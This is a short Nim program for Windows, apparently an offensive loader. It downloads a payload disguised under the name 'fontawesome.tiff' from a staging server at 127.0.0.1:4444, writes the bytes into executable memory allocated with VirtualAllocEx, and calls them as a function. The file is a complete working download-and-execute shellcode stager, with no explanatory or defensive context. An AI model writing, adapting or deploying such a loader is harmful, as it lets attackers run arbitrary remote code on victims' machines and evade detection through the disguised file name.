import std/[os, httpclient, strformat]
import winim/lean

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  var response: string = client.getContent(url)
  var shellcode: seq[byte] = toByteSeq(response)
  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
  defer: CloseHandle(pHandle)

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)

  copyMem(rPtr, addr shellcode[0], len(shellcode))


  let f = cast[proc() {.nimcall.}](rPtr)

  f()

proc main() =
  let domain = "127.0.0.1:4444"
  let url = fmt"https://{domain}/fontawesome.tiff"
  DownloadExecute(url)

if isMainModule:
  main()
